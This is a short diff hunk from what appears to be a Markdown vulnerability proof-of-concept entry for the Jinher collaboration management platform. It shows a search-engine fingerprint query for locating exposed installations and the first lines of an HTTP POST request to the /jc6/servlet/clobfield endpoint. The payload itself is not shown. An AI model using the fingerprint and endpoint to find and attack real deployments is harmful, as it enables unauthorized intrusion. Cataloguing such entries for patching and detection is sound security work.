@@ -7,7 +7,7 @@
 title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管理平台" && body="src=\"/jc6/platform/") || body="window.location = \"JHSoft.MobileApp/Default.htm\";" || banner="Path=/jc6"
 ```
 
-## poc
+## POC
 ```
 POST /jc6/servlet/clobfield HTTP/1.1
 host:127.0.0.1
